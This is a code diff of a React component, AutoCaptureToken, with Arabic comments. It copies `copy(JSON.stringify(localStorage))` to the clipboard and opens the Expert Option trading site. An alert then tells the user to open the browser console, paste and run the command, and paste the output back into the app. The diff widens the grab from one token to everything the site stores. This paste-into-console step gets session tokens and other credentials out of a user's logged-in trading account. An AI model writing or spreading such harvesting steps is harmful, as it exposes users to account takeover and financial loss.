@@ -847,23 +847,23 @@ function AutoCaptureToken() {
   })()`;
 
   const capture = () => {
-    // 1. انسخ الأمر للحافظة
-    navigator.clipboard?.writeText(CONSOLE_CMD).then(() => {
+    // انسخ أمر بسيط جداً — يطبع كل localStorage
+    navigator.clipboard?.writeText("copy(JSON.stringify(localStorage))").then(() => {
       setStatus("copied");
     });
 
-    // 2. افتح Expert Option
+    // افتح Expert Option
     window.open("https://app.expertoption.com/", "expertoption", "width=1200,height=800");
 
-    // 3. أظهر تعليمات مبسطة
+    // أظهر تعليمات بسيطة جداً
     setStatus("waiting");
     alert(
-      "تم نسخ أمر الالتقاط!\n\n" +
+      "تم نسخ أمر بسيط!\n\n" +
       "في نافذة Expert Option:\n" +
       "1. اضغط F12\n" +
       "2. اضغط Console\n" +
       "3. اضغط Ctrl+V ثم Enter\n\n" +
-      "ثم ارجع هنا والصق التوكن"
+      "سيتم نسخ كل البيانات. ارجع هنا والصقها."
     );
   };
 
